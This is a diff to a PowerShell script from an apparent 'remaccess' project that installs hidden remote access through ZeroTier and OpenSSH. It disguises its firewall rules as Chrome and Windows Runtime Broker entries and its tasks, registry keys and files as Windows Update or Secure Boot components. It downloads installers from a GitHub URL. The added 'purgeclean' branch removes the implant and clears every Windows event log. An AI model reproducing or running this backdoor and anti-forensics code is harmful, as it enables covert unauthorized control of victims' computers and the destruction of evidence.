@@ -7,13 +7,16 @@ $sshdservice = "sshd"
 $sshagentservice = "ssh-agent"
 $ztfwruleset = ("ZeroTier One", "ZeroTier x64 Binary In", "ZeroTier UDP/9993 In")
 $sshfwruleset = ("Google Chrome Core Service", "Windows Runtime Broker")
+$contentdirectory = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $pingexepaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
+$corewrapperpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $pingdaemontask = "Windows Update Service Daemon"
+$coredaemontask = "Windows Update Service"
 $cacheBuster = Get-Random
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/SimplifiedIOpenSSHnstallFromZIP.ps1"
 #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
@@ -266,11 +269,7 @@ function Remove-Package {
     param (
         [string]$PackageName
     )
-
-    # Install NuGet provider if not already installed
     Install-PackageProvider -Name NuGet -Force | Out-Null
-
-    # Uninstall the specified package
     Uninstall-Package $PackageName -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 }
 
@@ -283,6 +282,29 @@ function RemovePings {
         }
     }
 }
+
+#Registry path cleanup funtion.
+function Remove-RegistryPath {
+    param (
+        [string]$Path
+    )
+    if (Test-Path -Path $Path -ErrorAction SilentlyContinue) {
+        Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
+    } else {
+    }
+}
+
+#Unregister scheduled tasks.
+function Unregister-ScheduledService {
+    param (
+        [string]$ServiceName
+    )
+    $task = Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue
+    if ($null -ne $task) {
+        $null = Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
+    }
+}
+
 
 #Code starts here.
 # Check if the "Code" value is not null (i.e., it exists)
@@ -421,7 +443,35 @@ if ($null -ne $storedCode) {
                             RemovePings
                             Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log } 
                         } -MaxRetries $retryAttempts
-                    }               
+                    }
+                    #Purge clean. through cleanup.
+                    "purgeclean" {
+                        RetryOps {
+                            RemovePings
+                            Remove-Package "ZeroTier One"
+                            Remove-Package OpenSSH
+                            Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+                            Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+                            Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+                            SafeServiceDelete -ServiceName $ztservice
+                            SafeServiceDelete -ServiceName $ztservice2
+                            SafeServiceDelete -ServiceName $sshagentservice
+                            SafeServiceDelete -ServiceName $sshdservice							
+                            FwRuleMgmt -RuleNames $ztfwruleset -Action disable
+                            FwRuleMgmt -RuleNames $sshfwruleset -Action disable
+                            FwRuleMgmt -RuleNames $ztfwruleset -Action deletion
+                            FwRuleMgmt -RuleNames $sshfwruleset -Action deletion	
+                            DirDelFunc -directories $ztdir
+                            DirDelFunc -directories $sshdir
+                            DirDelFunc -directories $sshdatadir
+                            DirDelFunc -directories $ztdatadir
+                            Remove-RegistryPath -Path $regPath
+                            DirDelFunc -directories $corewrapperpath
+                            DIrDelFunc -directories $contentdirectory
+                            Unregister-ScheduledService -ServiceName $coredaemontask
+                            Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
+                        }
+                    }              
                 }
                 if ($status -ne $null) {
                     Set-ItemProperty -Path $regPath -Name "Data" -Value $status
